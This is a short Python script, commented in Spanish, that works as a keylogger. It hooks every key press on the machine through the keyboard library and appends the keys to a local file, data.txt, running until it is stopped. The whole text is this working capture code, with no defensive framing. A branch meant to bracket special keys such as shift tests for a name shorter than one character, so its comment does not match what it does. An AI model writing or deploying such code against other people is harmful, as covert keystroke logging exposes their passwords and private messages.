##Creacion de un codigo que permite almacenar el teclado por consola
import keyboard

def botonesPresionados(boton):


    with open('data.txt','a') as file:
        if boton.name == 'space':
            file.write(' ')
        elif boton.name == 'enter':
            file.write('\n')
        elif len (boton.name)<1:
            file.write(f'[{boton.name}]') # Captura las teclas como el shift o control.
        else:
            file.write(boton.name)


keyboard.on_press(botonesPresionados)
keyboard.wait()